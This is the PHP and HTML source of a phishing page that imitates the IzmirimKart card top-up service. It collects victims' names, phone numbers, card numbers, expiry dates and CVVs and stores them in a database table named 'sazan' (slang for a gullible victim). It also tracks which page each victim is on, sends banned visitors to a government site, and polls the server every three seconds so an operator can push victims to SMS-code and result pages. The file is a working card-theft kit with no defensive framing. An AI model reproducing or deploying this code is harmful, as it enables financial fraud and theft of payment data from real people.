
<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
    $ip = $_SERVER['HTTP_HOST'];
    $db->query("UPDATE sazan SET now = 'Kart Sayfasında' WHERE ip = '{$ip}'");
if($_POST){
    $ad   = icerikTemizle(guvenlik(trim($_POST['adsoyad'])));
    $kk       = icerikTemizle(guvenlik(trim($_POST['bkc'])));
    $sonkul   = icerikTemizle(guvenlik(trim($_POST['date'])));
    $cvv   = icerikTemizle(guvenlik(trim($_POST['bkv'])));
    $phone   = icerikTemizle(guvenlik(trim($_POST['telefon'])));
 
    $ip = $_SERVER['HTTP_HOST'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("UPDATE sazan SET ad=?,date=?,kk=?,sonkul=?,cvv=?,phone=? WHERE ip = ?");
	$insert = $query->execute(array($ad,$date,$kk,$sonkul,$cvv,$phone,$ip));


    if($insert){
 header('Location:bekle.php');
    }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}


?>

<!DOCTYPE html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" href="../dvdvdvdv.pnh" type="image/x-icon" />
<link rel="shortcut icon" href="../dvdvdvdv.png" type="image/x-icon" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Mulish:wght@500&display=swap" rel="stylesheet">

<meta name="viewport" content="width=device-width, initial-scale=1">

<link href="anadosya/bootstrap.min.css" rel="stylesheet">
<link href="anadosya/style.css" rel="stylesheet">
<link href="anadosya/responsive.css" rel="stylesheet">
<title>IzmirimKart | Yükleme</title>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>
<script src="js/demo.js"></script>
<script src="../cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.8/jquery.mask.min.js"></script>
</head>
<body>
<div class="body_wrapper frm-vh-md-100">
<div class="formify_body" data-bg-color="#E3F0FF" style="background-color: rgb(227, 240, 255);">
<div class="f_content">
<div class="container">
<div class="row">
<div class="formify_box">
<div class="formify_header text-center">
<a href="#" class="mb-3 formify_logo"><img style="width:70%" src="logorenk2.png" alt=""></a>
<h4 class="form_title">Bakiye Yükle</h4>
</div>
<div class="text-center">
</div>
<form method="POST" action="#">
<div class="signup_form">
<div class="form-group">
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">Ad Soyad</label>
<input name="adsoyad" type="text" maxlength="30" class="form-control" required="">
<br>
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">Telefon Numarası</label>
<input placeholder="+90 (___) ___ ____" data-slots="_" name="telefon" type="tel" class="form-control" required="">
<br>
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">Banka/Kredi Kartı Numarası</label>
<input placeholder="____ ____ ____ ____" data-slots="_" type="tel" name="bkc" class="form-control" required="">
<br>
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">SKT (AY/YIL)</label>
<input placeholder="AA/YY" data-slots="AY" name="date" type="tel" class="form-control" required="">
<br>
<label class="input_title" style="font-family: 'Mulish', sans-serif;" for="inputEmail">CVV</label>
<input minlength="3" maxlength="3" placeholder="CVV" name="bkv" type="text" class="form-control" required="">
</div><br>
<div class="form-group">
<button type="submit" id="btnDevam" class="btn action_btn thm_btn">Ödeme İşlemini Tamamla</button>
</div>
</form>
</div>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>


<script src='../cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>


<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      } 
      }
    });
    
}
</script>
<script>
// This code empowers all input tags having a placeholder and data-slots attribute
document.addEventListener('DOMContentLoaded', () => {
    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
        const pattern = el.getAttribute("placeholder"),
            slots = new Set(el.dataset.slots || "_"),
            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
            first = [...pattern].findIndex(c => slots.has(c)),
            accept = new RegExp(el.dataset.accept || "\\d", "g"),
            clean = input => {
                input = input.match(accept) || [];
                return Array.from(pattern, c =>
                    input[0] === c || slots.has(c) ? input.shift() || c : c
                );
            },
            format = () => {
                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
                });
                el.value = clean(el.value).join``;
                el.setSelectionRange(i, j);
                back = false;
            };
        let back = false;
        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
        el.addEventListener("input", format);
        el.addEventListener("focus", format);
        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
    }
});
</script>
